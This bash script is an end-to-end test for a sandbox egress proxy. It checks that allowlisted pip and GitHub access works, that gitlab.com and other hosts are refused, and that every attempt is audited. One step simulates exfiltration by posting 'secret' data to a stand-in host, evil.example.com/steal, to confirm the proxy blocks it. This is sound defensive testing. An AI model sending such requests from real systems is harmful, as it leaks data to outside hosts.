#!/usr/bin/env bash
# End-to-end test for governed egress: a sandbox can install dependencies
# from allowlisted registries and reach nothing else, and every attempt --
# allowed or denied -- lands in the audit trail.
#
# Needs real internet access from the cluster and an egress allowlist that
# covers pypi and github (what `make k3d-deploy` configures).
set -euo pipefail

NAMESPACE=${NAMESPACE:-paddock}
PORT=${PORT:-18081}
SERVER=http://localhost:$PORT

step() { printf '\n== %s\n' "$*"; }
fail() { printf 'FAIL: %s\n' "$*" >&2; exit 1; }
json() { python3 -c "import json,sys; print(json.load(sys.stdin)$1)"; }

step "port-forward paddock-server"
kubectl -n "$NAMESPACE" port-forward svc/paddock-server "$PORT:8080" >/dev/null 2>&1 &
PF_PID=$!
cleanup() {
  kill "$PF_PID" 2>/dev/null || true
  if [ -n "${SID:-}" ]; then
    curl -sf -X DELETE "$SERVER/v1/sessions/$SID" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT
for _ in $(seq 30); do curl -sf "$SERVER/healthz" >/dev/null 2>&1 && break; sleep 1; done
curl -sf "$SERVER/healthz" >/dev/null || fail "server /healthz unreachable via port-forward"

step "create session"
RESP=$(curl -sf -X POST "$SERVER/v1/sessions" -H 'content-type: application/json' \
  -d '{"user":"e2e","agent":"claude","budget_id":"default"}')
SID=$(echo "$RESP" | json "['id']")
NS=$(echo "$RESP" | json "['namespace']")
POD=$(echo "$RESP" | json "['pod']")
echo "session: $SID"
kubectl -n "$NS" wait --for=condition=Ready "pod/$POD" --timeout=180s

step "proxy env is wired, and model traffic bypasses it"
kubectl -n "$NS" exec "$POD" -- printenv HTTPS_PROXY | grep -q ':8082' \
  || fail "HTTPS_PROXY does not point at the gateway's egress proxy"
kubectl -n "$NS" exec "$POD" -- printenv https_proxy | grep -q ':8082' \
  || fail "lowercase https_proxy missing (curl only reads that one)"
# Without this the sandbox would tunnel its model calls through the CONNECT
# proxy back into the same gateway.
kubectl -n "$NS" exec "$POD" -- printenv NO_PROXY | grep -q 'paddock-gateway' \
  || fail "NO_PROXY must cover the gateway or model calls loop through the proxy"
echo "ok"

step "allowlisted: pip install through the proxy"
kubectl -n "$NS" exec "$POD" -- sh -c \
  'cd /workspace && python3 -m venv .venv >/dev/null 2>&1 && .venv/bin/pip install --quiet requests >/dev/null 2>&1 && .venv/bin/python -c "import requests; print(requests.__version__)"' \
  || fail "pip install failed through the egress proxy (is pypi.org allowlisted?)"
echo "ok"

step "allowlisted: git clone from github"
kubectl -n "$NS" exec "$POD" -- sh -c \
  'cd /tmp && rm -rf Hello-World && git clone --depth 1 -q https://github.com/octocat/Hello-World.git && test -e Hello-World/README' \
  || fail "git clone from github failed through the egress proxy"
echo "ok"

step "not allowlisted: gitlab.com is refused"
if kubectl -n "$NS" exec "$POD" -- sh -c \
  'cd /tmp && timeout 30 git clone --depth 1 -q https://gitlab.com/gitlab-org/gitlab-test.git' >/dev/null 2>&1; then
  fail "gitlab.com clone succeeded: the allowlist is not being enforced"
fi
echo "ok (refused)"

step "not allowlisted: exfiltration to an arbitrary host is refused"
if kubectl -n "$NS" exec "$POD" -- /workspace/.venv/bin/python -c '
import requests
requests.post("https://evil.example.com/steal", data=b"secret", timeout=20)
' >/dev/null 2>&1; then
  fail "POST to evil.example.com succeeded: egress is not governed"
fi
echo "ok (refused)"

step "audit trail: the allowed, the denied, and the bytes"
EVENTS=$(curl -sf "$SERVER/v1/sessions/$SID/events")
echo "$EVENTS" | grep -q '"host": *"pypi.org"' || fail "pypi.org fetch was not audited"
echo "$EVENTS" | grep -q 'egress.allowed' || fail "no egress.allowed events"
echo "$EVENTS" | grep -q 'package_registries' || fail "allowed egress is not attributed to its allowlist group"
echo "$EVENTS" | grep -q 'egress.closed' || fail "no egress.closed events (byte accounting missing)"
echo "$EVENTS" | grep -q '"host": *"gitlab.com"' || fail "the denied gitlab.com attempt was not audited"
echo "$EVENTS" | grep -q '"host": *"evil.example.com"' || fail "the exfiltration attempt was not audited"
echo "$EVENTS" | grep -q 'not_in_allowlist' || fail "denials do not record a reason"
python3 - "$EVENTS" <<'PY' || fail "egress.closed carries no byte counts"
import json, sys
events = json.loads(sys.argv[1])
closed = [e for e in events if e["kind"] == "egress.closed"]
assert closed, "no egress.closed"
assert any((e["payload"].get("bytes_received") or 0) > 0 for e in closed), "no bytes counted"
PY
echo "ok"

step "delete session"
curl -sf -X DELETE "$SERVER/v1/sessions/$SID" -o /dev/null
SID=""
echo "ok"

printf '\nE2E EGRESS PASSED\n'
